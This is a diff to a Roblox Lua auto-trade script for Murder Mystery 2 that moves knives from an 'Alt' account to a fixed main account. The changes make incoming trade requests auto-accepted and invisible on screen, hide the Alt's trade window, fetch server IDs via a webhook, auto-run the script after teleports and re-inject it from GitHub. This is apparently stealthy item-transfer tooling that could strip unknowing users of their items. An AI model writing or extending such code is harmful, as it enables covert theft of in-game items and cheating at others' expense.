+    local ReinjectBtn = makeStudioButton(ActionFrame2, "Reinjetar (GitHub)", UDim2.new(0.485, 0, 1, 0), 26, StudioTheme.btnBg, StudioTheme.text)
     ReinjectBtn.Position = UDim2.new(0.515, 0, 0, 0)
 
     local QuickInfo = Instance.new("Frame")
@@ -1692,7 +1910,7 @@ local function createAutoTradeHUD()
     InfoTitle.Size = UDim2.new(1, -16, 0, 20)
     InfoTitle.Position = UDim2.new(0, 8, 0, 6)
     InfoTitle.BackgroundTransparency = 1
-    InfoTitle.Text = "Informações do Sistema & Proteção Ativa"
+    InfoTitle.Text = "Informações do Sistema & Proteção"
     InfoTitle.TextColor3 = StudioTheme.blue
     InfoTitle.Font = Enum.Font.SourceSansSemibold
     InfoTitle.TextSize = 12
@@ -1703,10 +1921,7 @@ local function createAutoTradeHUD()
     InfoDesc.Size = UDim2.new(1, -16, 1, -30)
     InfoDesc.Position = UDim2.new(0, 8, 0, 26)
     InfoDesc.BackgroundTransparency = 1
-    InfoDesc.Text = string.format(
-        "• Destinatário: %s (Definido na chamada do script)\n• Segurança: A Alt apenas entrega itens para '%s' e recusa qualquer outro jogador.\n• Proteção da Main: NUNCA oferta itens, apenas aceita lotes recebidos.\n• Sem Webhook: Totalmente autocontido, sem tráfego de rede para o Discord.\n• Atalho: Pressione a tecla [ , ] para alternar a exibição deste painel.",
-        CONFIG.MAIN_USERNAME, CONFIG.MAIN_USERNAME
-    )
+    InfoDesc.Text = string.format("• Proteção Ativa: %s APENAS RECEBE facas e NUNCA oferta/entrega nada.\n• Pedidos de Trade aceitos automaticamente e mantidos 100%% INVISÍVEIS na tela.\n• Auto-Execute On Teleport: Carrega Dash.lua automaticamente em rejoining ou troca de servidor.\n• Atalho: Pressione a tecla [ , ] para alternar a exibição deste painel.", CONFIG.MAIN_USERNAME)
     InfoDesc.TextColor3 = StudioTheme.textMuted
     InfoDesc.Font = Enum.Font.SourceSans
     InfoDesc.TextSize = 12
@@ -1769,22 +1984,23 @@ local function createAutoTradeHUD()
     StatusLabel.Parent = Footer
 
     local function updateUI()
-        local partner = isMain and findAltInServer() or findReceiverInServer()
-        local partnerName = partner and partner.Name or (isMain and (State.ActiveAltName ~= "" and State.ActiveAltName or "Aguardando Alt...") or CONFIG.MAIN_USERNAME)
-        local present = (partner ~= nil)
+        local altPlayer = findAltInServer()
+        local activeAlt = altPlayer and altPlayer.Name or (State.ActiveAltName ~= "" and State.ActiveAltName or "Aguardando Alt...")
+        local present = (altPlayer ~= nil)
 
-        ReceiverVal.Text = CONFIG.MAIN_USERNAME
-        PartnerVal.Text = string.format("%s (%s)", partnerName, present and "No mesmo servidor (Online)" or "Não encontrado no servidor")
+        PartnerVal.Text = string.format("%s (%s)", activeAlt, present and "No mesmo servidor (Online)" or (State.ActiveAltName ~= "" and "Em outro servidor" or "Aguardando..."))
         PartnerVal.TextColor3 = present and StudioTheme.green or (State.ActiveAltName ~= "" and StudioTheme.yellow or StudioTheme.textMuted)
 
+        ServerVal.Text = string.format("JobId: %s...", string.sub(game.JobId ~= "" and game.JobId or "Studio", 1, 16))
         TierVal.Text = State.TopTierDetected
+        WebhookVal.Text = string.format("%s | Cmd: %s", State.WebhookStatus, State.ActiveCommand)
         StatsVal.Text = string.format("Lotes: %d  •  Facas: %d  •  Restantes: %d", State.TradesCompleted, State.KnivesTransferred, State.RemainingKnives)
 
         ToggleBtn.Text = State.Enabled and "Auto-Trade: LIGADO" or "Auto-Trade: DESLIGADO"
         ToggleBtn.BackgroundColor3 = State.Enabled and StudioTheme.green or StudioTheme.red
 
         if State.AllItemsTransferred then
-            StatusLabel.Text = string.format("Atalho: [ , ] Alternar  |  CONCLUÍDO (0 Facas Restantes)  |  Total: %d", State.KnivesTransferred)
+            StatusLabel.Text = string.format("Atalho: [ , ] Alternar  |  CONCLUÍDO (0 Facas Restantes - Parado)  |  Total: %d", State.KnivesTransferred)
         else
             StatusLabel.Text = string.format("Atalho: [ , ] Alternar  |  %s  |  Facas: %d", State.StatusMessage, State.KnivesTransferred)
         end
@@ -1824,7 +2040,7 @@ local function createAutoTradeHUD()
     TriggerBtn.MouseButton1Click:Connect(function()
         State.AllItemsTransferred = false
         State.TransferFinishedLogged = false
-        local partner = isMain and findAltInServer() or findReceiverInServer()
+        local partner = findAltInServer()
         if partner then
             addLog("Disparo manual de trade para " .. partner.Name)
             task.spawn(function()
@@ -1833,28 +2049,27 @@ local function createAutoTradeHUD()
                 end)
             end)
         else
-            addLog(string.format("Aviso: Parceiro '%s' não encontrado neste servidor!", isMain and (State.ActiveAltName ~= "" and State.ActiveAltName or "Alt") or CONFIG.MAIN_USERNAME))
+            addLog("Aviso: Alt não está neste servidor! Aguarde o teleporte para o servidor dela.")
         end
         updateUI()
     end)
 
-    TpPartnerBtn.MouseButton1Click:Connect(function()
-        local partner = isMain and findAltInServer() or findReceiverInServer()
-        if partner then
-            local ok = teleportCharToPartner(partner)
-            if ok then
-                addLog("Personagem teleportado até " .. partner.Name)
-            else
-                addLog("Falha ao teleportar até " .. partner.Name)
-            end
+    TpToAltBtn.MouseButton1Click:Connect(function()
+        local _, targetJobId = getWebhookData()
+        if targetJobId and targetJobId ~= "" and targetJobId ~= game.JobId and targetJobId ~= "Unknown" then
+            addLog(string.format("Teleportando %s para a Alt no servidor `%s`...", CONFIG.MAIN_USERNAME, targetJobId))
+            pcall(function()
+                queueScriptOnTeleport()
+                TeleportService:TeleportToPlaceInstance(game.PlaceId, targetJobId, LocalPlayer)
+            end)
         else
-            addLog("Aviso: Parceiro não está no mesmo servidor para teleporte.")
+            addLog("Aviso: JobId da Alt ainda não disponível via Webhook ou já está no mesmo servidor.")
         end
         updateUI()
     end)
 
     ReinjectBtn.MouseButton1Click:Connect(function()
-        addLog("Reinjeção manual acionada...")
+        addLog("Reinjeção manual via GitHub acionada...")
         reinjectFromGithub()
     end)
 
@@ -2133,11 +2348,11 @@ else
         "BevelEmoteHub",
         "PotassiumEmoteHub",
         "MM2AutoTradeRelayUI",
-        "MM2AutoTradeNoWebhookUI",
         "StudioAnimPackHub",
         "StudioAnimationHub"
     })
 end
+
 task.spawn(setupTradeGuiBgTransparency)
 task.spawn(setupInvisibleTradeRequest)
 task.spawn(hideAltTradeGUI)
@@ -2146,7 +2361,7 @@ if isMain and enforceMainReceivesOnly then
     task.spawn(enforceMainReceivesOnly)
 end
 
-addLog(string.format("MM2 Auto-Trade Standalone Ativo! Cargo: %s (%s) | Recebedor: %s", State.Role, myName, CONFIG.MAIN_USERNAME))
+addLog(string.format("MM2 Auto-Trade Relay Carregado! Cargo: %s (%s)", State.Role, myName))
 
 env._MM2AutoTradeCleanup = function()
     for _, conn in ipairs(altTradeGuiConnections) do
@@ -2158,7 +2373,6 @@ env._MM2AutoTradeCleanup = function()
         "BevelEmoteHub",
         "PotassiumEmoteHub",
         "MM2AutoTradeRelayUI",
-        "MM2AutoTradeNoWebhookUI",
         "StudioAnimPackHub",
         "StudioAnimationHub"
     })
